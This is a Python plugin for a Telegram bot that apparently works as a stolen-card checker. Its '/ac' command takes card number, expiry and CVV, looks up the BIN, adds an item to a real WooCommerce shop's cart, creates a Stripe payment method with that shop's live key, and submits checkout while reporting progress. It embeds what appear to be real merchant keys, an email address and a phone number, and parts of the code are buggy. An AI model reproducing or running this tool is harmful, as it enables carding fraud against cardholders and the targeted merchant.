import json
from values import *
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

import string
from datos import idchat
import random



@Client.on_message(filters.command(["ac"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Francia
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            
            headers = {
              "Host": "thewesternfrontway.com",
              "upgrade-insecure-requests": "1",
              "origin": "https://thewesternfrontway.com",
              "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryoBtbCaxLDFiRX85N",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
              "sec-fetch-site": "same-origin",
              "sec-fetch-mode": "navigate",
              "sec-fetch-dest": "document",
              "referer": "https://thewesternfrontway.com/product/pins/",
              "accept-language": "es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7",
            }
            data = {
              "quantity": "1",
              "add-to-cart": "2087"
            }
            
            res = requests.post('https://thewesternfrontway.com/product/pins/', headers=headers, data=data)
            
            
            hesders = {
              'Host': 'thewesternfrontway.com',
              'upgrade-insecure-requests': '1',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'sec-fetch-site': 'same-origin',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-dest': 'document',
              'referer': 'https://thewesternfrontway.com/cart/',
              'accept-encoding': 'gzip, deflate, br',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
            }
            
            res2 = requests.get('https://thewesternfrontway.com/checkout/', headers=headers)
            #print(res2.text)
            nonce = res2.text.split('woocommerce-process-checkout-nonce')
           # print(nonce)
            
            headers = {
              'Host': 'api.stripe.com',
              'Accept': 'application/json',
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
              'Origin': 'https://js.stripe.com',
              'Sec-Fetch-Site': 'same-site',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://js.stripe.com/',
              'Accept-Language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7'
            }
            data = {
              'type': 'card',
              'billing_details[address][city]': 'new york',
              'billing_details[address][country]': 'US',
              'billing_details[address][line1]': 'street90',
              'billing_details[address][postal_code]': '10080',
              'billing_details[address][state]': 'NY',
              'billing_details[name]': 'cedse Ramos',
              'billing_details[email]': 'munozcorrales14@gmail.com',
              'billing_details[phone]': '5052217458',
              'card[number]': cc,
              'card[cvc]': cvv,
              'card[exp_month]': mes,
              'card[exp_year]': ano,
              'guid': '38f7b750-54e2-4c8e-bc6e-93870e91a1122f8bb3',
              'muid': 'd0a21f39-fa4a-4791-bac0-8f713292408ae8064d',
              'sid': '8f65b48e-6487-4791-ab04-e30014bc492a940f50',
              'payment_user_agent': 'stripe.js/548fd5b0a2; stripe-js-v3/548fd5b0a2; card-element',
              'referrer': 'https://thewesternfrontway.com',
              'time_on_page': '116761',
              'key': 'pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn',
              '_stripe_account': 'acct_1LmxURFqX7Qf9vpm'
            }
            
            res3 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            #print(res3.text)
            if 'id' in res3.text:
              id1 = res3.json()['id']
              print(id)
            msg1=await message.reply(f"""<b>⎚Gateway| Francia
Card: <code>{ccs}</code>
Progress 🟠 4.18(s)</b>""")

            headers = {
              'Host': 'thewesternfrontway.com',
              'accept': 'application/json, text/javascript, */*; q=0.01',
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'x-requested-with': 'XMLHttpRequest',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
              'origin': 'https://thewesternfrontway.com',
              'sec-fetch-site': 'same-origin',
              'sec-fetch-mode': 'cors',
              'sec-fetch-dest': 'empty',
              'referer': 'https://thewesternfrontway.com/checkout/',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
            }
            data = {
              'billing_email': 'munozcorrales14@gmail.com',
              'billing_phone': '5052217458',
              'billing_postcode': '10080',
              'billing_state': 'NY',
              'billing_city': 'new york',
              'billing_address_1': 'street90',
              'billing_country': 'US',
              'billing_last_name': 'Ramos',
              'billing_first_name': 'cedse',
              'billing_address_2': '',
              'billing_company': '',
              'lang': 'en',
              'payment_method': 'woocommerce_payments',
              'wcpay-payment-method': id1,
              'wcpay-is-platform-payment-method': '',
              'terms': 'on',
              'terms-field': '1',
              'woocommerce-process-checkout-nonce': nonce,
              '_wp_http_referer': '/?wc-ajax=update_order_review',
              'wcpay-fingerprint': '307b92f6af07a10f8017d3eb1801f7bc',
            }
            res4 = requests.post('https://thewesternfrontway.com/?wc-ajax=checkout', headers=headers, data=data)
            if 'messages' in res4.text:
              message = res4.json()['messages']
            print(message)
            msg=await message.reply(f"""<b>⎚Gateway| Francia
Card: <code>{ccs}</code>
Progress 🟢 5.38(s)</b>""")
              